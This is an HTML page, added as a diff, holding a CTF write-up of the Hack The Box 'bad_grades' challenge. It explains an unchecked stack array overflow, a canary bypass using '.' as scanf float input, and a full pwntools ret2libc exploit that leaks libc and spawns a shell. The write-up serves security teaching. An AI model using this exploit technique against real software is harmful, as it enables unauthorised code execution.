@@ -1,0 +1,166 @@
+<head>
+<style>
+body {
+  background-color: lightblue;
+}
+</style>
+</head>
+
+<body>
+
+<h1 id="bad_grades">bad_grades</h1>
+<p>This is one of the hack the box challenges that I was solving the other day, and have noticed that such concepts appear quite frequently in many ctf&#39;s. I would like to take you through the entire challenge and hopefully you will be able to understand the underlying concept!</p>
+<p>First off, as usual we do a preliminary check on the binary given to us!</p>
+<h2 id="preliminary-checks-">Preliminary Checks:</h2>
+<pre><code>Canary                        : ✓ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : <span class="hljs-type">Full</span>
+gef➤
+</code></pre><p>Alright! So we see PIE disabled but Canary being enabled, which means, we will have to find a way to somehow bypass the canary or obtain a canary leak.</p>
+<p>Let&#39;s dive right into the binary by first running it to see what it is all about.</p>
+<pre><code>Your grades this semester were really good BAD!
+
+<span class="hljs-number">1</span>. View current grades.
+<span class="hljs-number">2</span>. <span class="hljs-keyword">Add</span><span class="bash"> new.
+</span>&gt;
+</code></pre><p>Okay so as we run the challenge with the command <code>./bad_grades</code>, we see that we are provided with two options, to view current grades and then to add new! </p>
+<p>Since we don&#39;t know anything about the challenge yet, let us go ahead and give choice 1.</p>
+<p>We see something like this:</p>
+<pre><code>Your grades <span class="hljs-keyword">this</span> semester were really good BAD!
+
+<span class="hljs-number">1.</span> View current grades.
+<span class="hljs-number">2.</span> Add <span class="hljs-keyword">new</span>.
+&gt; <span class="hljs-number">1</span>
+
+Your grades <span class="hljs-string">were:</span> 
+<span class="hljs-number">2</span>
+<span class="hljs-number">4</span>
+<span class="hljs-number">1</span>
+<span class="hljs-number">3</span>
+<span class="hljs-number">0</span>
+
+You need to <span class="hljs-keyword">try</span> HARDER!
+</code></pre><p>Alright, so it just exits! Nevermind, let&#39;s checkout out option 2! We get:</p>
+<pre><code>Your grades <span class="hljs-keyword">this</span> semester were really good BAD!
+
+<span class="hljs-number">1</span>. View current grades.
+<span class="hljs-number">2</span>. Add <span class="hljs-keyword">new</span>.
+&gt; <span class="hljs-number">2</span>
+Number <span class="hljs-keyword">of</span> grades: <span class="hljs-number">3</span>
+Grade [<span class="hljs-number">1</span>]: <span class="hljs-number">4</span>
+Grade [<span class="hljs-number">2</span>]: <span class="hljs-number">5</span>
+Grade [<span class="hljs-number">3</span>]: <span class="hljs-number">6</span>
+Your <span class="hljs-keyword">new</span> average <span class="hljs-keyword">is</span>: <span class="hljs-number">5.0</span><span class="hljs-number">0</span>
+</code></pre><p>OK! So here we are allowed to add new grades and at the end it prints our new avaerage. Now let&#39;s check out the decompilation for more specifics as to what the binary is doing! For decompilation I normally use IDA. However you are free to use any other software like Ghidra or Hopper V.</p>
+<pre><code><span class="hljs-keyword">unsigned</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_400FD5</span><span class="hljs-params">()</span>
+</span>{
+  <span class="hljs-keyword">int</span> num; <span class="hljs-comment">// [rsp+0h] [rbp-120h] BYREF</span>
+  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-11Ch]</span>
+  <span class="hljs-keyword">double</span> sum; <span class="hljs-comment">// [rsp+8h] [rbp-118h]</span>
+  <span class="hljs-keyword">double</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">33</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span>
+  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span>
+
+  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);
+  sum = <span class="hljs-number">0.0</span>;
+  sub_400ACB(<span class="hljs-string">"Number of grades: "</span>, <span class="hljs-string">"cyan"</span>, <span class="hljs-string">"bold"</span>);
+  __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;num);
+  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; num; ++i )
+  {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Grade [%d]: "</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(i + <span class="hljs-number">1</span>));
+    __isoc99_scanf(<span class="hljs-string">"%lf"</span>, &amp;<span class="hljs-built_in">array</span>[i]);
+    sum = <span class="hljs-built_in">array</span>[i] + sum;
+  }
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your new average is: %.2f\n"</span>, sum / (<span class="hljs-keyword">double</span>)num);
+  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;
+}
+</code></pre><p>The above is the decompilation of function at <code>0x400fd5</code> i.e <code>add_new()</code>. Since it is a stripped file, we may not be able to see seperate user defined functions as such.</p>
+<p>Okay, so what do we understand here? </p>
+<p>We see that at first we have an array variable declared locally with size 33. It then asks for how many grades we wish to enter. Since there is no check on the size, we can easily overflow the array variable to gain an rip control. With size=34, we see that it spits <code>*** stack smashing detected ***: terminated</code>. So we know, 33 is the size of array, and 34 is where the canary is located. </p>
+<p>Furthermore, we see a for loop wherein it asks us to give marks scored and we must observe that we can give any float value as input. However, one must also think as to how can canary and adress values be written in float! For that we can define a function in our exploit that specifically converts the integer to float something like this:</p>
+<pre><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">double_pointer</span><span class="hljs-params">(pointer_value)</span></span>:
+
+    byte_string = p64(pointer_value)
+    hex_byte_string = binascii.hexlify(byte_string)
+    x = struct.unpack(<span class="hljs-string">'d'</span>, hex_byte_string.decode(<span class="hljs-string">'hex'</span>))
+    <span class="hljs-keyword">return</span> x[<span class="hljs-number">0</span>]
+</code></pre><p>To bypass the canary check, since our input is a float value, we can give <code>.</code> as the input for filling up the canary. The <code>%.2f</code> in scanf will ignore the <code>.</code> character and instead store the resulting float value in xmm registers. </p>
+<p>Now our process is simple:</p>
+<ul>
+<li>Bypass canary</li>
+<li>Get a libc leak</li>
+<li>Apply dynamic rop ( or ret2libc) or call one_gadget</li>
+</ul>
+<h2 id="exploit-">Exploit:</h2>
+<pre><code class="lang-python=">def double_pointer(pointer_value):
+
+    byte_string = p64(pointer_value)
+    hex_byte_string = binascii.hexlify(byte_string)
+    x = struct.unpack(<span class="hljs-string">'d'</span>, hex_byte_string.decode(<span class="hljs-string">'hex'</span>))
+    return x[<span class="hljs-number">0</span>]
+
+<span class="hljs-keyword">from</span> pwn import *
+import struct
+import <span class="hljs-built_in">time</span>
+
+p = process(<span class="hljs-string">'./bad_grades'</span>)
+
+gdb.attach(p, gdbscript = <span class="hljs-string">'set disassembly-flavor intel\nb*0x4010e7\nc\n'</span>)
+p.recv()
+p.sendline(<span class="hljs-string">'2'</span>)
+p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">39</span>))
+
+<span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">33</span>):
+    p.sendline(<span class="hljs-string">'1'</span>)
+p.recv()
+p.sendline(<span class="hljs-string">'.'</span>)
+
+<span class="hljs-meta"># gadgets</span>
+pop_rdi = <span class="hljs-number">0</span>x0000000000401263
+puts_got = <span class="hljs-number">0</span>x601fa8
+puts_plt = <span class="hljs-number">0</span>x400680
+main = <span class="hljs-number">0</span>x00401108
+ret = <span class="hljs-number">0</span>x401107
+
+<span class="hljs-meta">#p.sendline(str(2.0744145*(10**-317)))</span>
+p.sendline(<span class="hljs-string">'.'</span>)
+<span class="hljs-meta">#p.sendline(str(double_pointer(ret)))</span>
+p.sendline(<span class="hljs-built_in">str</span>(double_pointer(pop_rdi)))
+p.sendline(<span class="hljs-built_in">str</span>(double_pointer(puts_got)))
+p.recv()
+p.sendline(<span class="hljs-built_in">str</span>(double_pointer(puts_plt)))
+p.sendline(<span class="hljs-built_in">str</span>(double_pointer(main)))
+
+p.recvline()
+leak = u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))
+info(<span class="hljs-string">'leak: %s'</span>%hex(leak))
+
+system = leak - <span class="hljs-number">0</span>x32190
+binsh = leak + <span class="hljs-number">0</span>x13019d
+
+info(<span class="hljs-string">'system: %s'</span>%hex(system))
+info(<span class="hljs-string">'binsh: %s'</span>%hex(binsh))
+
+<span class="hljs-meta">#p.recv()</span>
+p.sendline(<span class="hljs-string">'2'</span>)
+p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">38</span>))
+
+<span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">33</span>):
+    p.sendline(<span class="hljs-string">'1'</span>)
+p.recv()
+p.sendline(<span class="hljs-string">'.'</span>)
+p.sendline(<span class="hljs-string">'.'</span>)
+<span class="hljs-meta">#p.sendline(str(double_pointer(ret)))</span>
+p.sendline(<span class="hljs-string">"{}"</span>.<span class="hljs-built_in">format</span>(double_pointer(pop_rdi)))
+p.recv()
+print(double_pointer(binsh))
+
+
+p.sendline(<span class="hljs-string">"{}"</span>.<span class="hljs-built_in">format</span>(double_pointer(binsh) + <span class="hljs-number">0.63</span> * (<span class="hljs-number">10</span>**(-<span class="hljs-number">314</span>-<span class="hljs-number">9</span>))))
+p.sendline(<span class="hljs-string">"{}"</span>.<span class="hljs-built_in">format</span>(double_pointer(system) + <span class="hljs-number">0.00000000063</span> * (<span class="hljs-number">10</span>**-<span class="hljs-number">314</span>)))
+
+
+p.interactive()
+</code></pre>
+</body>
